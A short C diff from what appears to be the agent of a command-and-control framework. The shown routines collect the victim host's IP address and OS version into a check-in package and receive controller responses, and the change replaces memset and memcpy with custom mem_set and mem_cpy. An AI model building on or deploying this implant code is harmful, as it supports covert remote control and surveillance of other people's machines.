@@ -80,7 +80,7 @@ BOOL TransportInit( ) {
         if (GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
             PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
 
-            memset( Adapter, 0, Length );
+            mem_set( Adapter, 0, Length );
             LocalFree( Adapter );
             Adapter = NULL;
         }
@@ -103,7 +103,7 @@ BOOL TransportInit( ) {
     PackageAddInt32( Package, PROCESS_AGENT_ARCH );
     PackageAddInt32( Package, FALSE ); // default
 
-    memset( &OsVersions, 0, sizeof( OsVersions ) );
+    mem_set( &OsVersions, 0, sizeof( OsVersions ) );
     OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
     Instance.Win32.RtlGetVersion( &OsVersions );
 
@@ -215,8 +215,8 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
                 RespSize += BufRead;
 
-                memcpy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
-                memset( Buffer, 0, 1024 );
+                mem_cpy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
+                mem_set( Buffer, 0, 1024 );
 
             } while ( Successful == TRUE );
 
